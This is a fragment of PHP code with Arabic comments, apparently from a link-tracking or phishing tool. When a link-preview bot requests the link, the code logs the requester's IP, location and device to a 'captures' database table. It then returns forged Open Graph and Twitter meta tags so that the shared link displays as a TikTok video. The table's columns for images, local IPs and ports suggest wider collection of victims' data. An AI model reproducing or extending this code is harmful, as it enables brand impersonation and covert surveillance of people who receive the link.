        if ($is_bot) {
            // تسجيل طلب المعاينة الأولي (الذي يحدث فور إرسال الرابط ودون ضغط)
            $bot_ip = get_real_ip();
            $bot_location = get_ip_location($bot_ip);
            $bot_device = "Preview Bot / System Scraper";
            
            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=200', $bot_ip, 'Bot Preview', 'N/A', $bot_location, $bot_device, date('Y-m-d H:i:s')]);
            } catch (Exception $e) {}

            // إرسال بيانات المعاينة ليعرضها التطبيق (صورة وعنوان تيك توك)
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<title>' . htmlspecialchars($meta_title) . '<\/title>';
            echo '</head><body></body></html>';
            exit();
        }
